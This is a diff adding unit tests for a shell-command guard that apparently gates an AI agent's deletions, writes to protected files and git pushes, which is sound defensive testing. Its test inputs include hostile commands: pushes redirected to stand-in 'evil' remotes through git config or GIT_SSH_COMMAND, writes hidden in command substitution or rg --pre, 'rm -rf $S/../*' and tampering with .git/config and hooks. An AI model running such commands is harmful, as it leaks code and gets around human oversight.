@@ -444,6 +444,20 @@ class DeletesWhatTheSessionCreated(unittest.TestCase):
         subprocess.run(["git", "-C", os.path.join(self.zone, "repo"), "add", ".DS_Store"], check=True)
         self.assertEqual(self.run_rm("rm repo/.DS_Store"), "ask")
 
+    def test_scratch_folder_through_a_variable_assigned_in_the_same_command(self):
+        self.make("scratch/in.wav"); self.make("scratch/out.m4a")
+        s = os.path.join(self.zone, "scratch")
+        for c in [f"S={s}; ls $S; rm $S/in.wav $S/out.m4a; rmdir $S", f"S={s}\nls $S\nrm $S/in.wav $S/out.m4a\nrmdir $S"]:
+            self.assertEqual(self.run_rm(c), "allow", c)
+
+    def test_a_variable_that_cannot_be_resolved_still_asks(self):
+        self.make("scratch/in.wav"); self.make("scratch/old.wav", old=True)
+        s = os.path.join(self.zone, "scratch")
+        for c in [f"rm $S/in.wav", f"S=$(mktemp -d); rm $S/in.wav", f"S={s}; S=/x; rm $S/in.wav", f"S={s}; read S; rm $S/in.wav",
+                  f"false && S={s}; rm $S/in.wav", f"S={s}; rm $S/old.wav", f"S=/usr/local/share; rm $S/in.wav",
+                  f"S=/Users/nobody/x; rm $S/in.wav", f"S={s}; rm -rf $S/../*"]:
+            self.assertEqual(self.run_rm(c), "ask", c)
+
     def test_without_a_known_session_start_only_caches_go(self):
         self.make("new.txt"); self.make("__pycache__", folder=True)
         self.assertEqual(self.run_rm("rm new.txt", session=None), "ask")
@@ -1082,6 +1096,115 @@ class MergeGate(unittest.TestCase):
         self.assertEqual(self.judge(f"(cd {feature} && true); git merge x")[0], "deny")
         self.assertEqual(self.judge(f"(cd {feature} && git merge main)")[0], "ask")  # inside, the cd still counts
         self.assertEqual(self.judge(f"cd \"$(git -C {feature} rev-parse --show-toplevel)\" && true; git merge x")[0], "deny")
+
+
+class ReadsOfProtectedPaths(unittest.TestCase):
+    """A protected path is asked about when written; reading it (cat, grep, git diff, sed -n Np) must not ask, even when
+    the read-only command's text holds a word like rm / cp / tee. Anything not on the read_only_commands list stays asked."""
+    def protected(self, command, policy=None):
+        return guard.protected(command, policy or POLICY, ROOT)
+
+    def test_reads_do_not_ask(self):
+        for c in ["cat core/policy.json", "grep -n 'rm' core/guard/guard.py", "rg -n tee core/guard",
+                  "git diff core/policy.json | grep -n '^+.*cp'", "git log --oneline -- core/guard/guard.py | head -5",
+                  "sed -n 105,125p core/policy.json", "sed -n '5p' core/policy.json", "sed -n 5,9p core/policy.json | grep rm",
+                  "cd ~/Dev/repos/ai-setup; sed -n 1,5p core/policy.json", "cat core/policy.json | jq . | grep mv",
+                  "git show HEAD:core/policy.json | wc -l", "git diff core/guard/guard.py 2>&1 | head", "ls core/guard && cat core/policy.json"]:
+            self.assertIsNone(self.protected(c), c)
+            self.assertEqual(decision(c), "allow", c)
+
+    def test_writes_still_ask(self):
+        for c in ["sed -i s/a/b/ core/policy.json", "sed -n 5p -i core/policy.json", "echo x > core/policy.json",
+                  "cat core/policy.json > core/guard/guard.py", "cat x | tee core/policy.json", "cp /tmp/x core/policy.json",
+                  "grep rm core/policy.json; cp /tmp/x core/policy.json", "cat core/policy.json && rm core/policy.json",
+                  "git diff --output=core/policy.json",
+                  "grep rm core/policy.json > core/guard/guard.py", "git checkout core/policy.json"]:
+            self.assertEqual(decision(c), "ask", c)
+
+    def test_what_hides_a_write_asks(self):
+        for c in ["grep rm core/policy.json $(touch core/policy.json)", "grep rm core/policy.json `touch core/policy.json`",
+                  "cat core/policy.json <(cp /tmp/x core/policy.json)", "cat core/policy.json & cp /tmp/x core/policy.json",
+                  "grep rm core/policy.json <<EOF\nx\nEOF", "rg --pre=cp x core/policy.json", "rg --pre cp x core/policy.json",
+                  "FOO=1 grep rm core/policy.json", "sed -n '/rm/p' core/policy.json", "sed -n 5p core/policy.json -i",
+                  "grep rm core/policy.json | python3 -c 'open(\"core/policy.json\",\"w\")'"]:
+            self.assertEqual(decision(c), "ask", c)
+
+    def test_the_list_itself_refuses_what_could_write(self):
+        # judged on their own, whatever else the guard does with them: git accepts abbreviated options, sed has a w command
+        for c in ["git diff --out core/policy.json", "git log --o=core/policy.json", "git show --ou x", "git diff --output x",
+                  "sed -n '5w core/policy.json' x", "sed -n 5p core/policy.json -i", "cat x > y", "cat x >> y", "cat x &", "cat $(x)",
+                  "cat `x`", "cat <(x)", "cat <<E", "FOO=1 cat x", "(cat x)", "{ cat x; }", "rg --pre=cp x", "rg --pre cp x", "find . -delete",
+                  "git diff; sort -o x x", "", "   "]:
+            self.assertFalse(guard.read_only(c, POLICY), c)
+        for c in ["cat x", "git diff --stat | head", "git log --pretty=oneline", "git diff --color=always 2>&1", "sed -n 5,9p x", "cd a && ls"]:
+            self.assertTrue(guard.read_only(c, POLICY), c)
+
+    def test_commands_off_the_list_stay_asked(self):
+        for c in ["awk '{print}' core/policy.json; rm core/policy.json", "find core -name policy.json -delete",
+                  "xargs rm core/policy.json", "perl -pi -e 1 core/policy.json"]:
+            self.assertEqual(decision(c), "ask", c)
+
+    def test_without_a_list_nothing_is_a_read(self):
+        policy = {k: v for k, v in POLICY.items() if k != "read_only_commands"}
+        self.assertEqual(self.protected("grep -n rm core/guard/guard.py", policy), "core/guard/guard.py")
+
+
+class PushToAiBranches(unittest.TestCase):
+    """push_allow (a layer key) lets `git push` of an explicit ai/* branch to a listed remote run; everything else keeps asking."""
+    policy = dict(POLICY, push_allow={"remotes": ["origin"], "branches": ["ai/*"]})
+
+    def d(self, command, policy=None):
+        return guard.decide({"tool": "bash", "command": command, "cwd": ROOT}, policy or self.policy)[0]
+
+    def test_ai_branches_go(self):
+        for c in ["git push origin ai/x", "git push -u origin ai/my-topic", "git push --set-upstream origin ai/a/b",
+                  "git push origin ai/x:ai/x", "git push origin HEAD:ai/x", "git push origin HEAD:refs/heads/ai/x",
+                  "git push origin refs/heads/ai/x", "cd ../wt && git push -u origin ai/x",
+                  "git push -u origin ai/x 2>&1 | tail -3", "git commit -m x && git push origin ai/x"]:
+            self.assertEqual(self.d(c), "allow", c)
+
+    def test_everything_else_still_asks(self):
+        for c in ["git push", "git push origin", "git push -u origin", "git push origin main", "git push origin master",
+                  "git push origin HEAD", "git push -u origin HEAD", "git push origin ai/x --force", "git push --force origin ai/x",
+                  "git push -f origin ai/x", "git push --force-with-lease origin ai/x", "git push origin +ai/x",
+                  "git push origin +ai/x:ai/x", "git push origin ai/x:main", "git push origin main:ai/x ai/y:main",
+                  "git push --tags origin ai/x", "git push origin ai/x --tags", "git push origin tag v1", "git push origin refs/tags/ai/x",
+                  "git push --delete origin ai/x", "git push origin --delete ai/x", "git push origin :ai/x",
+                  "git push --all origin", "git push --mirror origin", "git push origin ai/x ai/y", "git push origin ai/x main",
+                  "git push upstream ai/x", "git push https://example.com/r.git ai/x", "git push -u fork ai/x",
+                  "git push origin ai/", "git push origin ai/*", "git push origin ai/../main", "git push origin ai/x:refs/tags/v1",
+                  "git push --no-verify origin ai/x", "git push --receive-pack=evil origin ai/x", "git push origin ai/x; git push origin main",
+                  "git push origin ai/x && git push --force origin ai/y", "git push origin refs/heads/main", "git push origin refs/ai/x",
+                  "git push origin $B", "git push origin ai/$B", "bash -c 'git push -u origin ai/x'", "git push origin ai/x:", "git push origin ai/x:$B"]:
+            self.assertEqual(self.d(c), "ask", c)
+
+    def test_a_changed_remote_or_config_asks(self):
+        for c in ["git '-C' /x push -u origin ai/x", 'git "-C" ../x push origin ai/x', "git \\-C ../x push origin ai/x", "git -'C' ../x push origin ai/x",
+                  "g'i't -C ../x push origin ai/x", "git '-c' remote.origin.pushurl=evil push origin ai/x", "git '--git-dir=/x' push origin ai/x",
+                  "printf '[remote \"origin\"]\\nurl=evil\\n' >> .git/config && git push origin ai/x", "sed -i s/a/b/ .git/config && git push origin ai/x",
+                  "echo x > ../wt/.git/config; git push origin ai/x", "git push origin ai/x; cp x .git/hooks/pre-push",
+                  "git -C ../wt push -u origin ai/x", "git -C /repo push origin ai/x", "git --no-pager push origin ai/x", "git -P push origin ai/x",
+                  "git --git-dir=.git push origin ai/x", "git --work-tree=. push origin ai/x", "git --namespace=n push origin ai/x",
+                  "git -c remote.origin.pushurl=https://evil/r.git push origin ai/x", "git -c url.https://evil/.insteadOf=git@ push origin ai/x",
+                  "git --git-dir=/elsewhere push origin ai/x", "GIT_SSH_COMMAND=evil git push origin ai/x",
+                  "git remote set-url origin https://evil/r.git && git push origin ai/x",
+                  "git config remote.origin.url https://evil/r.git; git push origin ai/x"]:
+            self.assertEqual(self.d(c), "ask", c)
+
+    def test_without_push_allow_every_push_asks(self):
+        self.assertEqual(self.d("git push -u origin ai/x", POLICY), "ask")
+        self.assertEqual(self.d("git push origin ai/x", dict(POLICY, push_allow={})), "ask")
+        self.assertEqual(self.d("git push origin ai/x", dict(POLICY, push_allow={"remotes": ["origin"]})), "ask")
+        self.assertEqual(self.d("git push origin ai/x", dict(POLICY, push_allow={"branches": ["ai/*"]})), "ask")
+
+    def test_only_listed_branches_and_remotes(self):
+        policy = dict(POLICY, push_allow={"remotes": ["fork"], "branches": ["bot/*"]})
+        self.assertEqual(self.d("git push fork bot/x", policy), "allow")
+        self.assertEqual(self.d("git push origin bot/x", policy), "ask")
+        self.assertEqual(self.d("git push fork ai/x", policy), "ask")
+
+    def test_the_decision_names_the_push_rule(self):
+        self.assertEqual(guard.bash("git push origin main", self.policy)[2], "git push *")
 
 
 class FailsClosed(unittest.TestCase):
